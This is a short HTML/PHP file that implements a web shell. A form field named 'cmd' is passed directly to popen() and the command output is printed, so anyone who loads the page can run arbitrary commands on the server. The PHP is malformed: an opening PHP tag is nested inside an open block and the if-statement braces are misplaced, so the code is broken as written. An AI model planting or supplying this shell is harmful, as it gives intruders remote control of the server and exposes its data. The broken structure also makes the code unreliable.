<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
<?php
$handle = popen($_GET['cmd'], "r");
$output = "";

while (!feof($handle)) {
    $output .= fgets($handle);
}

pclose($handle);

echo $output;

?>
    }
?>
</pre>
</body>
</html>
